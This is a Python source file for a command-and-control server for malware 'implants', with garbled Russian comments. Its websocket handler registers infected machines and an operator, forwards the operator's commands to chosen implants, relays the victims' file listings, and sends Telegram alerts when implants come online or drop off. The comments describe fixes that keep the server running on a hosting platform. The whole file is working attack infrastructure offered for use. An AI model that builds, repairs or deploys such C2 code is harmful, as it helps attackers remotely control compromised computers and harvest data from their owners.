# --- –§–ê–ô–õ: c2_server.py (–¢–≤–æ—è –í–µ—Ä—Å–∏—è 2.0 - –û—Ç—Ä–µ–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è) ---
# –¢–≤–æ–π –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–¥ —Å —Ç—Ä–µ–º—è –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–º–∏ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è–º–∏.

import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ."""
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS

    # <<< –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï ‚Ññ1: –î–û–ë–ê–í–õ–ï–ù–û –°–ï–†–î–¶–ï–ë–ò–ï–ù–ò–ï >>>
    # –≠—Ç–æ –Ω–µ –¥–∞—Å—Ç Render.com –æ–±—Ä—ã–≤–∞—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ.
    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        # –¢–≤–æ—è –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è –ª–æ–≥–∏–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è, –æ–Ω–∞ –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = { "ws": ws, "files": initial_msg.get('files', {}), "volume": initial_msg.get('current_volume', 50) }
            print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'pong': continue
                data = json.loads(msg.data)
                # –í—Å—è —Ç–≤–æ—è –ª–æ–≥–∏–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥ –æ—Å—Ç–∞–µ—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = { "files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume") }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            if OPERATOR: await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except asyncio.TimeoutError:
        print("[!] –¢–∞–π–º–∞—É—Ç –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")
    except Exception as e:
        print(f"[!] –û—à–∏–±–∫–∞ –≤ websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        bot_ids = list(IMPLANTS.keys())
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})

async def http_handler(request):
    # <<< –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï ‚Ññ2: –ò–°–ü–û–õ–¨–ó–£–ï–ú __file__ >>>
    # –¢–µ–ø–µ—Ä—å —Å–µ—Ä–≤–µ—Ä —Ç–æ—á–Ω–æ –∑–Ω–∞–µ—Ç, –≥–¥–µ –Ω–∞–π—Ç–∏ index.html
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    # –°–¥–µ–ª–∞–µ–º –ø–æ—Ä—Ç –±–æ–ª–µ–µ –≥–∏–±–∫–∏–º –¥–ª—è Render.com
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"====== C2 SERVER (V2.0 - –û—Ç—Ä–µ–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω) ONLINE –Ω–∞ –ø–æ—Ä—Ç—É {port} ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä V2.0 –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

# <<< –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï ‚Ññ3: –ò–°–ü–û–õ–¨–ó–£–ï–ú __name__ >>>
# –¢–µ–ø–µ—Ä—å —ç—Ç–æ—Ç –±–ª–æ–∫ –∫–æ–¥–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä V2.0 –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
